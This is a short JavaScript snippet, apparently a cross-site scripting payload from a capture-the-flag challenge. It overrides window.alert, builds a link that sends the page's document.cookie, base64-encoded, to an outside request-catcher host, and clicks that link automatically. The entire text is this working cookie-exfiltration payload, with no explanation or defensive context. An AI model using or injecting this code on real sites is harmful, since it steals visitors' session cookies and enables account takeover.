window.alert = function() {console.log("alert(1337)")};
var link = document.createElement("a");
link.setAttribute("href", "https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(document.cookie));
link.setAttribute("id", "link");
link.innerHTML = "hi"
document.body.appendChild(link)
document.querySelector("#link").click()
